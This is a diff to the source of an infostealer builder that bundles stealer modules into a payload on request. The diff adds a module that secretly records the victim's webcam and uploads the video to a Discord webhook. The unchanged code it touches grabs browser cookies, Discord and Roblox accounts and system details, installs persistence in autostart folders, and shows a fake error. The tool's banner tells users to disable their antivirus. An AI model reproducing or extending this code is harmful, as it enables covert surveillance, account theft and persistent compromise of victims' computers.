@@ -17,7 +17,6 @@ from screeninfo import *
 import psutil
 import GPUtil
 import sqlite3
-from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 import json
 from json import *
@@ -37,26 +36,28 @@ import shutil
 from pathlib import Path
 from zipfile import ZipFile
 from win32crypt import CryptUnprotectData
-from typing import Literal
 import uuid
 from PIL import ImageGrab
 import time
 import browser_cookie3
+import cv2
 
 def Startup():
-    ()
+    pass
 def System_Grab():
-    ()
+    pass
 def Screenshot_Grab():
-    ()
+    pass
+def Camera_Capture_Grab():
+    pass
 def Discord_Grab():
-    ()
+    pass
 def Browser_Grab():
-    ()
+    pass
 def Roblox_Grab():
-    ()
+    pass
 def Fake_Error():
-    ()
+    pass
 
 def current_time_day_hour():
     return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')
@@ -357,7 +358,7 @@ Main Screen  : "No"
 
         requests.post(webhook_url, data=json_data, headers=headers)
 
-    title = f':flag_{country_code}: | System Info `{username_pc} "{ip_address_public}"`:'
+    title = f':computer: | System Info `{username_pc} "{ip_address_public}"`:'
 
     fields = [
     {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
@@ -400,6 +401,7 @@ Longitude : "{longitude}"
 
 ] 
     embed_system(webhook_url, title, fields, color_embed, footer_embed, username_embed, avatar_embed)
+
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -668,7 +670,7 @@ def Discord_Grab():
                 except:
                     gift_codes_discord = "None"
 
-                embed = Embed(title=f':flag_{country_code}: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
+                embed = Embed(title=f':speech_balloon: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
                 embed.set_thumbnail(url=avatar_url_discord)
                 embed.add_field(name=":bust_in_silhouette: | Username:",
                                 value=f"```{username_discord}```", inline=True)
@@ -763,7 +765,7 @@ def Browser_Grab():
         def send(self):
             self.webhook.send(
                 embed=Embed(
-                    title=f":flag_{country_code}: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
+                    title=f":globe_with_meridians: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
                     description="```" +
                     '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                     color=color_embed,
@@ -856,8 +858,7 @@ def Browser_Grab():
                     for operation in operations:
                         try:
                             operation(path, profile)
-                        except Exception as e:
-                            # print(e)
+                        except:
                             pass
 
         def get_master_key(self, path: str) -> str:
@@ -930,7 +931,7 @@ def Browser_Grab():
                     __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                 conn.close()
             except:
-                ()
+                pass
 
             os.remove('cookie_db')
 
@@ -1100,7 +1101,6 @@ def Roblox_Grab():
         return browser_cookie3.brave(domain_name="roblox.com")
 
     browsers = [Edge, Chrome, Firefox, Opera, Safari, Brave]
-
     for browser in browsers:
         cookie, navigator = get_cookie_and_navigator(browser)
         if cookie:
@@ -1112,27 +1112,27 @@ def Roblox_Grab():
 
             try:
                 username_roblox = information['UserName']
-            except KeyError:
+            except:
                 username_roblox = "None"
 
             try:
                 user_id_roblox = information["UserID"]
-            except KeyError:
+            except:
                 user_id_roblox = "None"
 
             try:
                 robux_roblox = information["RobuxBalance"]
-            except KeyError:
+            except:
                 robux_roblox = "None"
 
             try:
                 premium_roblox = information["IsPremium"]
-            except KeyError:
+            except:
                 premium_roblox = "None"
 
             try:
                 avatar_roblox = information["ThumbnailUrl"]
-            except KeyError:
+            except:
                 avatar_roblox = avatar_embed
 
             try:
@@ -1164,6 +1164,53 @@ def Roblox_Grab():
 
             client.send(embed=embed, username=username_embed,
                               avatar_url=avatar_embed)
+'''
+
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+CameraCaptureGrab = r'''
+def Camera_Capture_Grab():
+    try:
+        from datetime import datetime
+        time_capture = 10
+        cap = cv2.VideoCapture(0)
+
+        if not cap.isOpened():
+            return
+
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        name_file_capture = f"CameraCapture_{username_pc}.avi"
+        path_file_capture = os.path.join(os.getcwd(), name_file_capture)
+        out = cv2.VideoWriter(path_file_capture, fourcc, 20.0, (640, 480))
+
+        time_start = datetime.now()
+        while (datetime.now() - time_start).seconds < time_capture:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+
+        cap.release()
+        out.release()
+
+        if os.path.exists(path_file_capture):
+            embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
+            embed.set_footer(text=footer_text, icon_url=avatar_embed)
+
+            webhook = SyncWebhook.from_url(webhook_url)
+            with open(path_file_capture, "rb") as f:
+                webhook.send(
+                    embed=embed,
+                    file=File(f, filename=name_file_capture),
+                    username=username_embed,
+                    avatar_url=avatar_embed
+                )
+            if os.path.exists(path_file_capture):
+                os.remove(path_file_capture)
+    except:
+        pass
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -1210,34 +1257,34 @@ Startup = r'''
 def Startup():
    try:
     try:
-        chemin_script = os.path.abspath(__file__)
-        nouveau_nom = "ㅤ.py"
+        path_script = os.path.abspath(__file__)
+        new_name = "ㅤ.py"
 
         if sys.platform.startswith('win'):  
-            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         elif sys.platform.startswith('darwin'): 
-            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
         elif sys.platform.startswith('linux'):
-            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
         else:
             pass
-        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)
+        path_new_file = os.path.join(folder, new_name)
 
-        shutil.copy(chemin_script, chemin_nouveau_fichier)
-        os.chmod(chemin_nouveau_fichier, 0o777) 
+        shutil.copy(path_script, path_new_file)
+        os.chmod(path_new_file, 0o777) 
     except:
-        chemin_script = sys.executable
-        nouveau_nom = "ㅤ.exe"
+        path_script = sys.executable
+        new_name = "ㅤ.exe"
         if sys.platform.startswith('win'):  
-            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         elif sys.platform.startswith('darwin'): 
-            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
         elif sys.platform.startswith('linux'):
-            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
             
-        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)
-        shutil.copy(chemin_script, chemin_nouveau_fichier)
-        os.chmod(chemin_nouveau_fichier, 0o777)
+        path_new_file = os.path.join(folder, new_name)
+        shutil.copy(path_script, path_new_file)
+        os.chmod(path_new_file, 0o777)
    except:
        pass
 '''
@@ -1260,6 +1307,10 @@ except:
     pass
 try:
     System_Grab()
+except:
+    pass
+try:
+    Camera_Capture_Grab()
 except:
     pass
 try:
@@ -1319,6 +1370,10 @@ while True:
     except:
         pass
     try:
+        Camera_Capture_Grab()
+    except:
+        pass
+    try:
         Discord_Grab()
     except:
         pass
@@ -1367,6 +1422,7 @@ try:
     import shutil
     import tkinter as tk
     import time
+    import json
     from tkinter import filedialog
     from tkinter import ttk
 except Exception as e:
@@ -1374,26 +1430,47 @@ except Exception as e:
 
 
 Title("Builder Grab")
-    
+ 
 print(f"""
-{red}{INFO} File detected by the antivirus, but be aware that there is no backdoor!{color.WHITE}   
-
                       ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
                       {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
                       ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝
 
+{red}{INFO} File detected by the antivirus, but be aware that there is no backdoor!  
 {red}{INFO} Only your webhook will be taken into account, no other webhook will be added to your Stealer.
 {red}{INFO} Deactivate your antivirus so that no files are deleted after your build.
-{red}{INFO} Custom your grabber:""")
+{red}{INFO} Custom your stealer:""")
+
+def disinfect():
+    try:
+        if sys.platform.startswith('win'):  
+            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        elif sys.platform.startswith('darwin'): 
+            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+        elif sys.platform.startswith('linux'):
+            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+
+        file = f"{folder}/ㅤ.exe"
+        if os.path.exists(file):
+            os.remove(file)
+
+        file = f"{folder}/ㅤ.py"
+        if os.path.exists(file):
+            os.remove(file)
+
+        print(f"{red}[{white}{current_time_hour()}{red}] {INFO} Disinfection is successfully, restart your pc.")
+    except Exception as e:
+        print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Error during disinfection: {white}{e}")
 
 if sys.platform.startswith("win"):
     "WINDOWS"
     def update_variables():
-        global add_system, add_discord, add_browser, add_roblox, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
+        global add_system, add_discord, add_browser, add_roblox, add_cameracapture, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
         add_system = add_system_var.get()
         add_discord = add_discord_var.get()
         add_browser = add_browser_var.get()
         add_roblox = add_roblox_var.get()
+        add_cameracapture = add_cameracapture_var.get()
         add_screenshot = add_screenshot_var.get()
         add_startup = add_startup_var.get()
         add_fake_error = add_fake_error_var.get()
@@ -1409,19 +1486,6 @@ if sys.platform.startswith("win"):
         if not name_file.strip() or name_file in ["File Name"]:
             random_number = random.randint(1, 1000)
             name_file = f'BuilderGrab_{random_number}'
-
-        print(f"{INFO} Webhook            :{white}", webhook)
-        print(f"{INFO} System Grab        :{white}", add_system)
-        print(f"{INFO} Discord Grab       :{white}", add_discord)
-        print(f"{INFO} Browser Grab       :{white}", add_browser)
-        print(f"{INFO} Roblox Grab        :{white}", add_roblox)
-        print(f"{INFO} Screenshot Grab    :{white}", add_screenshot)
-        print(f"{INFO} Launch at Startup  :{white}", add_startup)
-        print(f"{INFO} Fake Error         :{white}", add_fake_error)
-        print(f"{INFO} Restart Every 5min :{white}", add_restart)
-        print(f"{INFO} File Type          :{white}", exe_or_not)
-        print(f"{INFO} File Name          :{white}", name_file)
-        print(f"{INFO} Icon Path          :{white}", icon_path)
 
         root.quit()
         root.destroy()
@@ -1447,7 +1511,7 @@ if sys.platform.startswith("win"):
     root = tk.Tk()
     root.iconbitmap('Img/RedTiger_icon.ico')
     root.title(f'{name_tool} {version_tool} | Builder Stealer')
-    root.geometry("800x400")
+    root.geometry("800x440")
     root.resizable(False, False)
 
     red_color = '#a80505'
@@ -1479,49 +1543,52 @@ if sys.platform.startswith("win"):
     root.grid_columnconfigure(0, weight=0) 
     webhook_entry.config(width=60)
 
-
-    add_system = "None"
-    add_discord = "None"
-    add_browser = "None"
-    add_roblox = "None"
-    add_screenshot = "None"
-    add_startup = "None"
-    add_fake_error = "None"
-    add_restart = "None"
+    add_system = "Disable"
+    add_discord = "Disable"
+    add_browser = "Disable"
+    add_roblox = "Disable"
+    add_cameracapture = "Disable"
+    add_screenshot = "Disable"
+    add_startup = "Disable"
+    add_fake_error = "Disable"
+    add_restart = "Disable"
     webhook = "None"
     name_file = "None"
     icon_path = ""
 
-    add_system_var = tk.StringVar(value="None")
-    add_discord_var = tk.StringVar(value="None")
-    add_browser_var = tk.StringVar(value="None")
-    add_roblox_var = tk.StringVar(value="None")
-    add_screenshot_var = tk.StringVar(value="None")
-    add_startup_var = tk.StringVar(value="None")
-    add_fake_error_var = tk.StringVar(value="None")
-    add_restart_var = tk.StringVar(value="None")
+    add_system_var = tk.StringVar(value="Disable")
+    add_discord_var = tk.StringVar(value="Disable")
+    add_browser_var = tk.StringVar(value="Disable")
+    add_roblox_var = tk.StringVar(value="Disable")
+    add_cameracapture_var = tk.StringVar(value="Disable")
+    add_screenshot_var = tk.StringVar(value="Disable")
+    add_startup_var = tk.StringVar(value="Disable")
+    add_fake_error_var = tk.StringVar(value="Disable")
+    add_restart_var = tk.StringVar(value="Disable")
     exe_option_var = tk.StringVar(value="Python File")
 
     style = ttk.Style()
     style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=custom_color, relief='raised',indicatorsize=20)
 
-    add_system_cb = ttk.Checkbutton(root, text="System Grab", variable=add_system_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_discord_cb = ttk.Checkbutton(root, text="Discord Grab", variable=add_discord_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_browser_cb = ttk.Checkbutton(root, text="Browser Grab", variable=add_browser_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_roblox_cb = ttk.Checkbutton(root, text="Roblox Grab", variable=add_roblox_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot Grab", variable=add_screenshot_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+    add_system_cb = ttk.Checkbutton(root, text="System Grab", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_discord_cb = ttk.Checkbutton(root, text="Discord Grab", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_browser_cb = ttk.Checkbutton(root, text="Browser Grab", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_roblox_cb = ttk.Checkbutton(root, text="Roblox Grab", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 
-    add_system_cb.grid(row=4, column=0, padx=(180, 20), sticky="w")
-    add_discord_cb.grid(row=5, column=0, padx=(180, 20), sticky="w")
-    add_browser_cb.grid(row=6, column=0, padx=(180, 20), sticky="w")
-    add_roblox_cb.grid(row=7, column=0, padx=(180, 20), sticky="w")
-    add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
-    add_fake_error_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
-    add_startup_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
-    add_restart_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
+    add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
+    add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
+    add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
+    add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
+    add_cameracapture_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
+    add_screenshot_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
+    add_fake_error_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
+    add_startup_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
+    add_restart_cb.grid(row=8, column=1, padx=(5, 10), sticky="w")
 
 
     style = ttk.Style()
@@ -1563,18 +1630,22 @@ if sys.platform.startswith("win"):
     style = ttk.Style()
     style.configure('CustomButton.TButton', borderwidth=0, background=custom_background, font=('Calibri', 15, "bold"), foreground=custom_background)
 
-    build_button = ttk.Button(root, text="Build", command=update_variables, style='CustomButton.TButton', width=15)
-    build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(100,0))
+    build_button = ttk.Button(root, text="Build Stealer", command=update_variables, style='CustomButton.TButton', width=15)
+    build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
+
+    disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
+    disinfect_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
 
 
 elif sys.platform.startswith("linux"):
     "LINUX"
     def update_variables():
-        global add_system, add_discord, add_browser, add_roblox, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
+        global add_system, add_discord, add_browser, add_roblox, add_cameracapture, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
         add_system = add_system_var.get()
         add_discord = add_discord_var.get()
         add_browser = add_browser_var.get()
         add_roblox = add_roblox_var.get()
+        add_cameracapture = add_cameracapture.get()
         add_screenshot = add_screenshot_var.get()
         add_startup = add_startup_var.get()
         add_fake_error = add_fake_error_var.get()
@@ -1590,19 +1661,6 @@ elif sys.platform.startswith("linux"):
         if not name_file.strip() or name_file in ["File Name"]:
             random_number = random.randint(1, 1000)
             name_file = f'BuilderGrab_{random_number}'
-
-        print(f"{INFO} Webhook            :{white}", webhook)
-        print(f"{INFO} System Grab        :{white}", add_system)
-        print(f"{INFO} Discord Grab       :{white}", add_discord)
-        print(f"{INFO} Browser Grab       :{white}", add_browser)
-        print(f"{INFO} Roblox Grab        :{white}", add_roblox)
-        print(f"{INFO} Screenshot Grab    :{white}", add_screenshot)
-        print(f"{INFO} Launch at Startup  :{white}", add_startup)
-        print(f"{INFO} Fake Error         :{white}", add_fake_error)
-        print(f"{INFO} Restart Every 5min :{white}", add_restart)
-        print(f"{INFO} File Type          :{white}", exe_or_not)
-        print(f"{INFO} File Name          :{white}", name_file)
-        print(f"{INFO} Icon Path          :{white}", icon_path)
 
         root.quit()
         root.destroy()
@@ -1639,48 +1697,52 @@ elif sys.platform.startswith("linux"):
     webhook_entry.grid(row=1, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
     webhook_entry.insert(0, "Webhook URL")
 
-    add_system = "None"
-    add_discord = "None"
-    add_browser = "None"
-    add_roblox = "None"
-    add_screenshot = "None"
-    add_startup = "None"
-    add_fake_error = "None"
-    add_restart = "None"
+    add_system = "Disable"
+    add_discord = "Disable"
+    add_browser = "Disable"
+    add_roblox = "Disable"
+    add_cameracapture = "Disable"
+    add_screenshot = "Disable"
+    add_startup = "Disable"
+    add_fake_error = "Disable"
+    add_restart = "Disable"
     webhook = "None"
     name_file = "None"
     icon_path = ""
 
-    add_system_var = tk.StringVar(value="None")
-    add_discord_var = tk.StringVar(value="None")
-    add_browser_var = tk.StringVar(value="None")
-    add_roblox_var = tk.StringVar(value="None")
-    add_screenshot_var = tk.StringVar(value="None")
-    add_startup_var = tk.StringVar(value="None")
-    add_fake_error_var = tk.StringVar(value="None")
-    add_restart_var = tk.StringVar(value="None")
+    add_system_var = tk.StringVar(value="Disable")
+    add_discord_var = tk.StringVar(value="Disable")
+    add_browser_var = tk.StringVar(value="Disable")
+    add_roblox_var = tk.StringVar(value="Disable")
+    add_cameracapture_var = tk.StringVar(value="Disable")
+    add_screenshot_var = tk.StringVar(value="Disable")
+    add_startup_var = tk.StringVar(value="Disable")
+    add_fake_error_var = tk.StringVar(value="Disable")
+    add_restart_var = tk.StringVar(value="Disable")
     exe_option_var = tk.StringVar(value="Python File")
 
     style = ttk.Style()
     style.configure('Custom.TCheckbutton', font=('Calibri', 18), background=root.cget('bg'), foreground=custom_color, relief='raised',indicatorsize=20)
 
-    add_system_cb = ttk.Checkbutton(root, text="System Grab", variable=add_system_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_discord_cb = ttk.Checkbutton(root, text="Discord Grab", variable=add_discord_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_browser_cb = ttk.Checkbutton(root, text="Browser Grab", variable=add_browser_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_roblox_cb = ttk.Checkbutton(root, text="Roblox Grab", variable=add_roblox_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot Grab", variable=add_screenshot_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
-    add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+    add_system_cb = ttk.Checkbutton(root, text="System", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_discord_cb = ttk.Checkbutton(root, text="Discord", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_browser_cb = ttk.Checkbutton(root, text="Browser", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_roblox_cb = ttk.Checkbutton(root, text="Roblox", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_cameracapture_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot", variable=add_screenshot_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 
     add_system_cb.grid(row=4, column=0, padx=(180, 20), sticky="w")
     add_discord_cb.grid(row=5, column=0, padx=(180, 20), sticky="w")
     add_browser_cb.grid(row=6, column=0, padx=(180, 20), sticky="w")
     add_roblox_cb.grid(row=7, column=0, padx=(180, 20), sticky="w")
-    add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
-    add_fake_error_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
-    add_startup_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
-    add_restart_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
+    add_cameracapture_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
+    add_screenshot_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
+    add_fake_error_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
+    add_startup_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
+    add_restart_cb.grid(row=8, column=1, padx=(5, 10), sticky="w")
 
     name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
     name_file_entry.grid(row=9, column=0, padx=(60, 0), pady=(20, 10))
@@ -1697,14 +1759,29 @@ elif sys.platform.startswith("linux"):
     if exe_option_var.get() == "Python File":
         icon_button.config(state="disabled")
 
-    build_button = ttk.Button(root, text="Build", command=update_variables, style='CustomButton.TButton', width=15)
-    build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(100,0))
+    build_button = ttk.Button(root, text="Build Stealer", command=update_variables, style='CustomButton.TButton', width=15)
+    build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(300,0))
 
-
+    disinfect_button = ttk.Button(root, text="Self Disinfect", command=disinfect, style='CustomButton.TButton', width=15)
+    disinfect_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(0,80))
 
 root.mainloop()
 
 CheckWebhook(webhook)
+
+print(f"{INFO} Webhook            :{white}", webhook)
+print(f"{INFO} System Grab        :{white}", add_system)
+print(f"{INFO} Discord Grab       :{white}", add_discord)
+print(f"{INFO} Browser Grab       :{white}", add_browser)
+print(f"{INFO} Roblox Grab        :{white}", add_roblox)
+print(f"{INFO} Camera Capture     :{white}", add_cameracapture)
+print(f"{INFO} Screenshot         :{white}", add_screenshot)
+print(f"{INFO} Launch at Startup  :{white}", add_startup)
+print(f"{INFO} Fake Error         :{white}", add_fake_error)
+print(f"{INFO} Restart Every 5min :{white}", add_restart)
+print(f"{INFO} File Type          :{white}", exe_or_not)
+print(f"{INFO} File Name          :{white}", name_file)
+print(f"{INFO} Icon Path          :{white}", icon_path)
 
 file_text_relative = f'./1-FileOutput/BuilderStealer/{name_file}.txt'
 file_text = os.path.abspath(file_text_relative)
@@ -1721,7 +1798,9 @@ print(f"{color.RED}{INFO} Installing missing modules:{color.RESET}")
 if sys.platform.startswith("win"):
     "WINDOWS"
     os.system("pip install --upgrade pip setuptools wheel")
+    os.system("pip install setuptools")
     os.system("pip install browser_cookie3")
+    os.system("pip install opencv-python")
     os.system("pip install Pillow")
     os.system("pip install pywin32")
     os.system("pip install discord")
@@ -1731,6 +1810,7 @@ if sys.platform.startswith("win"):
     os.system("pip install psutil")
     os.system("pip install screeninfo")
     os.system("pip install sqlite3")
+    os.system("pip install discord.py")
     os.system("pip install --upgrade discord.py")
     os.system("pip install pyinstaller")
     os.system("pip install auto-py-to-exe")
@@ -1738,7 +1818,9 @@ if sys.platform.startswith("win"):
 elif sys.platform.startswith("linux"):
     "LINUX"
     os.system("pip3 install --upgrade pip setuptools wheel")
+    os.system("pip3 install setuptools")
     os.system("pip3 install browser_cookie3")
+    os.system("pip3 install opencv-python")
     os.system("pip3 install Pillow")
     os.system("pip3 install pywin32")
     os.system("pip3 install discord")
@@ -1748,44 +1830,51 @@ elif sys.platform.startswith("linux"):
     os.system("pip3 install psutil")
     os.system("pip3 install screeninfo")
     os.system("pip3 install sqlite3")
+    os.system("pip3 install discord.py")
     os.system("pip3 install --upgrade discord.py")
     os.system("pip3 install pyinstaller")
     os.system("pip3 install auto-py-to-exe")
 
 time.sleep(3)
 
+
 with open(file_text, 'w', encoding='utf-8') as file:
  try:
     file.write(f"webhook_url = \"{webhook}\"")
     file.write(Obligatory)
 
-    if add_system in ['y']:
+    if add_system in ['Enable']:
         file.write(SystemGrab)
 
-    if add_discord in ['y']:
+    if add_discord in ['Enable']:
         file.write(DiscordGrab)
 
-    if add_browser in ['y']:
+    if add_browser in ['Enable']:
         file.write(BrowserGrab)
 
-    if add_roblox in ['y']:
+    if add_roblox in ['Enable']:
         file.write(RobloxGrab)
 
-    if add_screenshot in ['y']:
+    if add_cameracapture in ['Enable']:
+        file.write(CameraCaptureGrab)
+
+    if add_screenshot in ['Enable']:
         file.write(ScreenshotGrab)
 
-    if add_startup in ['y']:
+    if add_startup in ['Enable']:
         file.write(Startup)
 
-    if add_fake_error in ['y']:
+    if add_fake_error in ['Enable']:
         file.write(FakeError)
 
     file.write(Start)
 
-    if add_restart in ['y']:
+    if add_restart in ['Enable']:
         file.write(Restart)
+
  except Exception as e:
     print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")
+
 
 try:
     with open(file_text, 'r', encoding='utf-8') as file_txt:
@@ -1800,6 +1889,7 @@ try:
     print(f"{color.RED}\n{INFO} Python file created: \"{color.WHITE}{file_python}{color.RED}\"")
 except Exception as e:
    print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")
+
 
 def convert_to_exe(script_name, destination_path, icon_path=None):
     print(f"{color.RED}{INFO} Converting to .exe:{color.RESET}")
@@ -1842,6 +1932,45 @@ try:
     os.startfile(path)
 except:
